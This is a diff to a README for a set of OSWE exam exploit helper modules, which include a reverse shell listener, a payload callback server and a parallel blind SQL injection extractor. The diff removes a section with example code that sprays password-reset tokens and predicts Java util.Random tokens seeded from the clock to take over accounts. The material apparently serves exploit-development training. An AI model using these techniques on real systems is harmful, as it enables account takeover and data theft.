@@ -12,7 +12,6 @@ Helper modules for writing OSWE exploit scripts. Pull what you need into your sc
 ├── shell_listener.py       # TCP reverse shell listener
 ├── web_callback_server.py  # Serve payloads + catch callbacks (XSS, XXE, SSRF)
 ├── sqli_parallel.py        # Parallel blind SQLi extractor
-├── token_bruteforce.py     # Token spray + Java util.Random predictor
 └── websocket_helper.py     # WebSocket response drainer (targets with WS interfaces)
 ```
 
@@ -232,37 +231,6 @@ result = extract_string_blind(is_correct_char, length=32, label="password hash")
 All `(position, character)` combinations are submitted at once. The thread pool caps concurrency at `max_workers=30`. For a 32-char string over a 62-char charset, that's ~2000 tasks – done in roughly the time it takes to test a single character sequentially.
 
 Tune `max_workers` down if you're hitting rate limits, up if the target handles the load.
-
----
-
-### token_bruteforce.py
-
-**Generic spray** – works with any list of candidate tokens:
-
-```python
-def try_token(token: str) -> bool:
-    r = session.post(TARGET + "/resetPassword", data={
-        "token": token, "password1": new_pass, "password2": new_pass
-    })
-    return "success" in r.text.lower()
-
-winner = spray_tokens(token_list, try_token, label="reset token")
-```
-
-**Java `util.Random` prediction** – for apps that seed their token generator with `System.currentTimeMillis()`:
-
-```python
-t0 = int(time.time() * 1000)
-session.post(TARGET + "/requestReset", data={"id": username})
-t1 = int(time.time() * 1000)
-
-tokens = generate_java_random_tokens(
-    start_seed   = t0 - 1000,   # ±1s padding for server clock drift
-    end_seed     = t1 + 1000,
-    token_length = 40,           # match the app's token length
-)
-winner = spray_tokens(tokens, try_token, label="reset token")
-```
 
 ---
 
